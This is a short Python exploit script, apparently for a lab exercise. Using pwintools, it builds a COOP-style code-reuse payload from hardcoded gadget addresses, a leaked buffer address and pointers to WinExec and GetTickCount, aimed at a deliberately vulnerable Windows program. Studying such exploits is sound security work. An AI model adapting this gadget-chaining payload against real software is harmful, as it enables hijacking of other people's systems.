from pwintools import *
import sys

#proc = Process("../COOP_Vuln_program/x64/Debug/COOP_Vuln_program.exe")
WinExec = p64(0x7ffaab756200)
GetTick = p64(0x7ffaab705950)
#WinExex = proc.get_proc_address('kernel32.dll','WinExec')
main_loop_gadget = p64(0x140018520)
inv_gadget = p64(0x140018640)
inv_ret_gadget = p64(0x140018690) 
#proc.recvuntil(b'COOP buffer at:')
#buff_addr = proc.recvline()
buff_addr = int(input("Insert leaked address: "),16)
PAYLOAD = p64(buff_addr+0x20) +\
    (GetTick) +\
    p64(0x0) +\
    p64(0x1) +\
    inv_ret_gadget
#proc.recvuntil(b'size:')
input ("Press any key... ")
#proc.sendline(len(PAYLOAD))
#proc.recvuntil(b'buffer:')
#proc.sendline(PAYLOAD)
#sys.stdout.buffer.write(PAYLOAD)
print(PAYLOAD)